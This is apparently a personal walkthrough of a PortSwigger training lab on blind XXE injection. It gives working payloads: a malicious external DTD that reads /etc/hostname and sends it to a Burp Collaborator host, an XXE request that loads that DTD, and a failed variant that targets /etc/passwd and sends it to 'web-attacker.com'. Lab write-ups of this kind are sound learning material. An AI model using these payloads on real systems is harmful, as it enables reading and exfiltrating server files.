# [Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

## Lab

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the  `/etc/hostname` file.

## Analysis

check stock request:

```http
POST /product/stock HTTP/1.1
Content-Length: 107
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

the body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```

## tools

- burpsuite scanner: detected `Issue:Â External service interaction (HTTP)`

  - request

  ```xml
  <?xml version="1.0" encoding="UTF-8" standalone='no'?>
  <!DOCTYPE stockcheck [<!ENTITY % d1964 SYSTEM "http://adryohq4xmilalscvl1acdafw62x1lr9qxho4es3.oastify.com">%d1964; ]>
  <stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
  </stockCheck>
  ```

## Solutions

craft a malicious DTD at exploit-server/exploit.dtd:

  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
  %eval;
  %exfiltrate;
  ```

- `eval`: dynamic declaration of the exfiltrate entity
- `%eval`: perform dynamic declaraction of exfiltrate entity
- dynamic declaraction:
  - `&#x25;` => `%`
  - `%file;` => content of `"file:///etc/hostname"`

xxe:

```xml
<?xml version="1.0" encoding="UTF-8" standalone='no'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-id.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

## failed attempts

- don't use external DTD:

  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % exfiltrate SYSTEM 'https://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>
  %eval;
  %exfiltrate;
  ```

  - the `%file` is just treated as string => failed

- blocked:

  ```xml
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY %eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
  %eval;
  %exfiltrate; ]>
  ```

  - `&#x25` => `"Entities are not allowed for security reasons"`
